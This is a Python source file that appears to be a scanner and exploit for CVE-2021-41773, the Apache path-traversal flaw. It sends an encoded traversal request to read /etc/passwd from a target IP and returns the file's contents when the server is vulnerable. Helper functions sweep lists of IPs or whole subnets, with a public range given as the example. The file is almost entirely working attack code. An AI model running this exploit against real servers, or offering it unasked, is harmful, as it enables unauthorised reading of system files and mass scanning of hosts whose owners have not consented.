import os
import sys
import getopt
import ipaddress
import urllib.request
import socket
import os.path
from ipaddress import IPv4Network


def usage():
    comm = os.path.basename(sys.argv[0])
    if os.path.dirname(sys.argv[0]) == os.getcwd():
        comm = "./" + comm
    print("Usage: CVE-2021-41773 options\n")
    print("     Only for one ip: python CVE-2021-41773.py IP_address\n")
    print("     -f For ip list in file")
    print("         Example: python CVE-2021-41773.py -f IP_address_list_filename")
    print("     -s For Subnet")
    print("         Example: python CVE-2021-41773.py -s 8.8.8.0/24")


def validateIP(ip):
    try:
        ipaddress.ip_address(ip)

    except ValueError:
        message = f"{ip} does not appear to be an IPv4 or IPv6 address"
        return message


def checkApache(ip):
    message = validateIP(ip)

    if not message:
        url = f"http://{ip}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd\n"
        req = urllib.request.Request(url)

        try:
            output = urllib.request.urlopen(req, timeout=5)  # nosec
            if output.status == 200:
                content = output.read().decode("utf-8")
                if "root:" in content:
                    message = f"Server {ip} IS VULNERABLE"
                    result = {"message": message, "content": content}
                    return result

            else:
                message = f"Server {ip} is not Vulnerable"

        except urllib.error.URLError as e:
            message = f"[URLError] Server {ip} is not Vulnerable"

        except socket.timeout:
            message = f"Server {ip} is not response"

        except ConnectionResetError:
            message = f"Server {ip} connection reset"

    result = {"message": message}
    return result


def checkfile(filename):
    if os.path.exists(os.getcwd() + "/" + filename):
        openfile = open(os.getcwd() + "/" + filename, "r")
        IPs = openfile.readlines()
        count = 0
        for line in IPs:
            count += 1
            checkApache(line.strip())


def checknet(net):
    count = 0
    subnet = IPv4Network(net, False)
    for addr in subnet:
        count += 1
        checkApache(str(addr))


def start(ip):
    return checkApache(ip)
    # try:
    #    opts, args = getopt.getopt(argv, "f:s:")
    # except getopt.GetoptError:
    #    usage()


#
# for opt, arg in opts:
#    if opt == '-f':
#        checkfile(arg)
#    elif opt == '-s':
#        checknet(arg)
